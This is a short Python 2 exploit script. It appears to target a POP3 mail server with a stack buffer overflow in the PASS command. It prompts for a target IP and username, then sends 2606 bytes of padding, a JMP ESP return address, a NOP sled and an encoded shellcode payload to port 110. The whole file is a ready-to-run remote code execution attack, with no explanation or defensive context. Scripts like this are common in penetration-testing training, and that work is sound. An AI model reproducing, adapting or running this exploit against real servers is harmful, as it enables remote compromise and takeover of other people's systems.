#!/usr/bin/python

import socket
import re

ip = raw_input("What IP adddress would you like to connect to: \n")

payload = (
"\xba\x1f\xfe\x2d\x34\xd9\xc4\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\xd9\xfa\xcf\xc1\x19\xea\x92"
"\x2a\xe1\xeb\xf2\xa3\x04\xda\x32\xd7\x4d\x4d\x83\x93\x03\x62"
"\x68\xf1\xb7\xf1\x1c\xde\xb8\xb2\xab\x38\xf7\x43\x87\x79\x96"
"\xc7\xda\xad\x78\xf9\x14\xa0\x79\x3e\x48\x49\x2b\x97\x06\xfc"
"\xdb\x9c\x53\x3d\x50\xee\x72\x45\x85\xa7\x75\x64\x18\xb3\x2f"
"\xa6\x9b\x10\x44\xef\x83\x75\x61\xb9\x38\x4d\x1d\x38\xe8\x9f"
"\xde\x97\xd5\x2f\x2d\xe9\x12\x97\xce\x9c\x6a\xeb\x73\xa7\xa9"
"\x91\xaf\x22\x29\x31\x3b\x94\x95\xc3\xe8\x43\x5e\xcf\x45\x07"
"\x38\xcc\x58\xc4\x33\xe8\xd1\xeb\x93\x78\xa1\xcf\x37\x20\x71"
"\x71\x6e\x8c\xd4\x8e\x70\x6f\x88\x2a\xfb\x82\xdd\x46\xa6\xca"
"\x12\x6b\x58\x0b\x3d\xfc\x2b\x39\xe2\x56\xa3\x71\x6b\x71\x34"
"\x75\x46\xc5\xaa\x88\x69\x36\xe3\x4e\x3d\x66\x9b\x67\x3e\xed"
"\x5b\x87\xeb\xa2\x0b\x27\x44\x03\xfb\x87\x34\xeb\x11\x08\x6a"
"\x0b\x1a\xc2\x03\xa6\xe1\x85\x21\x3c\xe9\xb8\x5e\x40\xe9\x43"
"\x24\xcd\x0f\x29\x4a\x98\x98\xc6\xf3\x81\x52\x76\xfb\x1f\x1f"
"\xb8\x77\xac\xe0\x77\x70\xd9\xf2\xe0\x70\x94\xa8\xa7\x8f\x02"
"\xc4\x24\x1d\xc9\x14\x22\x3e\x46\x43\x63\xf0\x9f\x01\x99\xab"
"\x09\x37\x60\x2d\x71\xf3\xbf\x8e\x7c\xfa\x32\xaa\x5a\xec\x8a"
"\x33\xe7\x58\x43\x62\xb1\x36\x25\xdc\x73\xe0\xff\xb3\xdd\x64"
"\x79\xf8\xdd\xf2\x86\xd5\xab\x1a\x36\x80\xed\x25\xf7\x44\xfa"
"\x5e\xe5\xf4\x05\xb5\xad\x15\xe4\x1f\xd8\xbd\xb1\xca\x61\xa0"
"\x41\x21\xa5\xdd\xc1\xc3\x56\x1a\xd9\xa6\x53\x66\x5d\x5b\x2e"
"\xf7\x08\x5b\x9d\xf8\x18" ) 

#5F4A358F   FFE4             JMP ESP

buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90" * 16 + payload + "C"*(3500-2606-4-351-16) 

uname = raw_input("What username would you like to connect to the POP3 server using?: \n")

prog = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")

if prog.match(ip):

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        sock.connect((ip, 110))
        print "\nConnecting to POP3 port"
        data = sock.recv(1024)
        print data
        sock.send("USER " + uname + '\r\n')
        data = sock.recv(1024)
        sock.send("PASS " + buffer + '\r\n')
        sock.send('QUIT\r\n')
        sock.close()
    except:
        print "Could not connect to POP3!"

